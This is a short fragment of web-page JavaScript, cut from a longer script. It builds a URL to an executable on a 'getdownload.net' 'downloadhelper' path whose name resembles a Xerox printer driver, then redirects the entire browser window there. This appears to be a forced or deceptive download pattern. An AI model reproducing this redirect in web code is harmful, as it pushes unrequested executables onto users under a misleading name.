        var host=  'rt4.getdownload.net';
        var port=  '';
        var file=  '/downloadhelper/named/xeroxep32990_jp/zfJWsAhR/Pp-Sm4kd/teste.exe';
        var link = protocol+"://"+host+port+file;
        top.location.href=link;
    }
